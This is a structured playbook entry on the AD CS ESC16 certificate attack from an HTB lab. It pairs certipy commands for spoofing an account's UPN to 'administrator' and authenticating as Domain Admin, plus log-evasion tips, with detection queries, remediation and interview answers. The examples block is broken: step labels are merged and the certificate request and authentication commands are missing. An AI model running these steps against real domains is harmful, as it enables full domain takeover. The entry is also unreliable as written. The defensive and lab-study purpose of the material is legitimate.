name: AD CS ESC16 - Security Extension Disabled (UPN Spoof to DA)
description: ESC16 abuses a CA that globally disables the SID security extension (szOID_NTDS_CA_SECURITY_EXT). With write over a controlled account's userPrincipalName, set its UPN to a privileged target (e.g. administrator), request a client-auth certificate, revert the UPN, then authenticate with the cert as the target - because the cert carries no SID binding, the DC maps it purely by UPN. Final step of the HTB Fluffy chain (ca_svc -> Administrator).
notes:
=== WHAT ESC16 IS ===
The CA is configured to OMIT the SID security extension (szOID_NTDS_CA_SECURITY_EXT)
from every certificate it issues (globally disabled). Modern DCs use that extension to
strongly bind a certificate to an account SID; without it, certificate-based logon falls
back to mapping by userPrincipalName (UPN). So if you can change a controlled account's
UPN to a privileged target and get a cert, the DC authenticates you as the target.

=== REQUIREMENTS ===
  - An account you control that can enroll in a client-auth template (e.g. User).
  - Write over that account's userPrincipalName (you control it, or have GenericWrite).
  - The CA has ESC16 (certipy find flags [!] ESC16 / 'security extension disabled').
  - Clock in sync with the DC (PKINIT) - see ad-faketime-kerberos.

=== THE FLOW (certipy) ===
  1. Set the controlled account UPN to the target (drop any @domain suffix for a bare name):
       certipy account update -user <controlled_account> -upn administrator ...
  2. Request a cert AS the controlled account (the cert now bears UPN=administrator):
       certipy req -u <controlled_account>@<domain> -p <password> -ca <ca_name> -template User ...
  3. Revert the UPN so you do not break the account / raise flags:
       certipy account update -user <controlled_account> -upn <controlled_account>@<domain> ...
  4. Authenticate with the cert - the DC maps it to administrator by UPN:
       certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
     -> yields administrator TGT + NT hash (UnPAC).

=== FLUFFY ===
  ca_svc taken via Shadow Credentials -> ca_svc can update its own UPN -> ESC16 to
  Administrator -> admin hash -> root flag.

examples.label: 1) Set controlled account UPN to administrator
examples.command: certipy-ad account update -u ca_svc@fluffy.htb -p '<ca_svc_pass_or_hash>' -dc-ip 10.129.65.243 -user ca_svc -upn administrator

examples.label: 2) Request a cert as the controlled account (now UPN=administrator)
3) Revert the UPN
examples.command: certipy-ad account update -u ca_svc@fluffy.htb -p '<pass>' -dc-ip 10.129.65.243 -user ca_svc -upn ca_svc@fluffy.htb

examples.label: 4) Authenticate as administrator with the cert

recommended.note: Take the CA-managing service account first via Shadow Credentials.
PKINIT cert auth fails on clock skew - sync time first.
ESC1 is the SAN-based sibling when the template allows enrollee-supplied subject.

defense.why_it_works: The issuing CA globally disables the SID security extension, so issued certificates lack the strong SID binding. Certificate logon then maps by userPrincipalName. An attacker who can rewrite a controlled account's UPN to a privileged target obtains a certificate that the DC honors as that target.
defense.prerequisites: Control of an account that can enroll in a client-auth template, write over its userPrincipalName, and a CA with the security extension disabled (ESC16).
defense.impact: Authentication as any account (including Domain Admin / Administrator) via a forged-identity certificate - full domain compromise.
defense.detection: [MITRE T1649] Event 5136 modifying userPrincipalName on an account (especially set to a privileged name, then reverted); Event 4886/4887 on the CA (certificate requested/issued) for that account; Event 4768 PKINIT logon as the target using a certificate; certipy find output marking the CA as ESC16.
defense.artifacts: 5136 UPN change + revert pair; 4886/4887 CA enrollment; 4768 PKINIT as the impersonated account; issued .pfx on the attacker host.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136 AttributeLDAPDisplayName="userPrincipalName"
| table _time, SubjectUserName, ObjectDN, AttributeValue, OperationType

index=wineventlog sourcetype="WinEventLog:Security" (EventCode=4886 OR EventCode=4887)
| table _time, Requester, CertificateTemplate, ComputerName
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136 and AttributeLDAPDisplayName == "userPrincipalName"
| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, NewUPN=tostring(AttributeValue), OperationType
| join kind=leftouter (
    SecurityEvent | where EventID in (4886, 4887)
    | project CaTime=TimeGenerated, Requester, CertificateTemplate
) on $left.Actor == $right.Requester
| sort by TimeGenerated desc
defense.prevention: Re-enable the SID security extension on the CA (do NOT globally disable szOID_NTDS_CA_SECURITY_EXT); enforce strong certificate mapping on DCs (KB5014754 Full Enforcement); restrict who can modify userPrincipalName; require CA manager approval on client-auth templates; treat CA servers as Tier-0; monitor 5136 on userPrincipalName and 4886/4887 enrollment.
defense.evasion: Revert the UPN immediately after enrollment so the account looks normal; use the issued certificate only for a single PKINIT auth to minimize logging.
defense.misconfiguration: CA has the SID security extension disabled globally (ESC16), and a controllable account can both enroll for client-authentication certificates and have its userPrincipalName rewritten.
defense.vulnerable_config:
# certipy flags it:
certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -stdout
# Look for: [!] ESC16 / 'Security Extension Disabled' on the CA.
# Registry on the CA (bad): szOID_NTDS_CA_SECURITY_EXT disabled via DisableExtensionList / EDITF flags.
defense.secure_config:
# Re-enable the SID security extension on the CA (remove it from the disable list), then restart certsvc:
certutil -setreg policy\DisableExtensionList -szOID_NTDS_CA_SECURITY_EXT
certutil -setreg policy\EditFlags +EDITF_... # (undo any weakening flags)
net stop certsvc && net start certsvc
# Enforce strong certificate mapping on DCs (KB5014754 Full Enforcement) so UPN-only mapping is rejected.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

interview.q: Explain ESC16 and how it differs from ESC1.
interview.a: ESC16 is a CA-wide misconfiguration where the SID security extension is disabled on all issued certificates, so certificate logon maps by UPN instead of a strong SID binding. You rewrite a controlled account's UPN to a target, enroll, revert, and authenticate as the target. ESC1 instead relies on a specific template that lets the enrollee supply the SAN directly; ESC16 needs no such template because the weakness is the whole CA dropping the SID binding.

interview.q: As a defender, how do you detect and prevent ESC16?
interview.a: Detect via Event 5136 changes to userPrincipalName (set to a privileged name then reverted) correlated with CA enrollment (4886/4887) and PKINIT logon (4768). Prevent by re-enabling the SID security extension on the CA, enforcing strong certificate mapping on DCs (KB5014754 Full Enforcement), restricting UPN write access, and treating CA hosts as Tier-0.

explain:
Rewrites a controlled account's UPN to a privileged target, abusing an ESC16 CA that globally omits the SID security extension:
  account update            modify a directory account's attributes
  -u <user>@<domain> -p <password>   authenticate
  -dc-ip <dc_ip>            the Domain Controller
  -user <controlled_account>   the account whose userPrincipalName you rewrite (you must have write over it)
  -upn administrator        the privileged UPN to impersonate
After this, enroll a client-auth cert as that account and PKINIT: because the SID extension is missing, the DC maps the cert to administrator by UPN. Reset the UPN afterward.
